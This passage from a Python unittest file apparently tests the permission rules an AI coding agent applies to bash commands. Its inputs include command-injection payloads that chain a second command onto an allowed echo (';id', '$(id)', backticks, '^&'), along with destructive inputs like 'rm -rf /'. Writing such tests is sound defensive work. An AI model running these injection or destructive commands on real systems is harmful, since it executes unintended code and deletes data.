    r"""echo 'a & echo PWNED5'""",
    r"""echo "a" ^& echo PWNED6""",
    "echo %COMSPEC%", "echo hi > f", "echo hi && echo x", "echo hi | cat", "echo $(id)", "echo `id`",
    "echo hi\nid", "echo hi\tthere", "echo héllo", "echo *", "echo ~", "echo !x", "echo a;id",
    "echo $'a'", "echo \\x", "echo 'open", "echo (a)", "echo {a,b}", "echo a#b", "echo a\x00b", "",
    "echo a'b'", "echo 'a'b",
]


class WhitelistAllowTests(unittest.TestCase):
    ALLOW = {"allow": ["bash(echo *)", "bash(printf *)", "bash(git status*)", "bash(pytest *)", "bash(ls*)"]}

    def test_payloads_never_allowed_in_local(self):
        pr = rules(self.ALLOW)
        for cmd in ROUND_PAYLOADS:
            with self.subTest(cmd=cmd):
                self.assertNotEqual(pr.evaluate("bash", bash(cmd), "local").decision, R.ALLOW)

    def test_guard_mode_runs_compound_unless_deny_or_ask(self):
        pr = rules()
        for cmd in ("ls | head", "pytest -q && make", 'ls "a; b"', "echo $(pwd)", "make > out.txt"):
            with self.subTest(cmd=cmd):
                self.assertEqual(pr.evaluate("bash", bash(cmd), "guard").decision, R.ALLOW)
                self.assertEqual(pr.evaluate("bash", bash(cmd), "local").decision, R.ASK)
        self.assertEqual(pr.evaluate("bash", bash("ls | git push"), "guard").decision, R.ASK)
        self.assertEqual(pr.evaluate("bash", bash("ls | rm -rf /"), "guard").decision, R.DENY)

    def test_safe_table_still_allowed(self):
        pr = rules(self.ALLOW)
        for cmd in ("git status", "pytest -q tests/test_x.py", "ls -la src", "echo hello",
                    "echo 'hello world'", 'echo "a b"', "echo a=b", "git status -s", "ls src/a_b-c.py"):
            with self.subTest(cmd=cmd):
                self.assertEqual(pr.evaluate("bash", bash(cmd), "local").decision, R.ALLOW)

    def test_glob_not_allowed(self):
        v = rules(self.ALLOW).evaluate("bash", bash("pytest tests/*"), "local")
        self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"))

    def test_deny_still_first(self):
        pr = rules({"allow": ["bash(echo *)"], "deny": ["bash(rm *)"]})
        self.assertEqual(pr.evaluate("bash", bash("echo hi; rm -rf x"), "local").decision, R.DENY)

    def test_oversize_asks(self):
        self.assertEqual(rules(self.ALLOW).evaluate("bash", bash("echo " + "a" * 20000), "local").decision, R.ASK)


if __name__ == "__main__":
    unittest.main()
